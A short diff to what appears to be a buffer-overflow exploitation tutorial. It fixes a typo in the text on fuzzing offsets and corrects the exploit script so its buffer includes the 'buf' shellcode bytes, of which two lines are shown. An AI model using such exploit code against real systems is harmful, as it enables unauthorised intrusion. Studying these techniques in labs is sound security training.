@@ -43,7 +43,7 @@ Fuzzing with 2000 bytes
 Fuzzing crashed at 2000 bytes
 ```
 
-As we can see, our fuzzer crashed the application on 2000 bytes. Which means our offset should be in range of ``1900`` to ``2000". Note this down.
+As we can see, our fuzzer crashed the application on 2000 bytes. Which means our offset should be in range of ``1900`` to ``2000``. Note this down.
 
 ## Crash Replication & Controlling EIP
 
@@ -415,7 +415,7 @@ buf += "\xb1\x97\xd6\xd5\xdc\x27\x0d\x19\xd9\xab\xa7\xe2\x1e"
 buf += "\xb3\xc2\xe7\x5b\x73\x3f\x9a\xf4\x16\x3f\x09\xf4\x32"
 postfix = ""
 
-buffer = prefix + overflow + retn + padding + payload + postfix
+buffer = prefix + overflow + retn + padding + buf + postfix
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
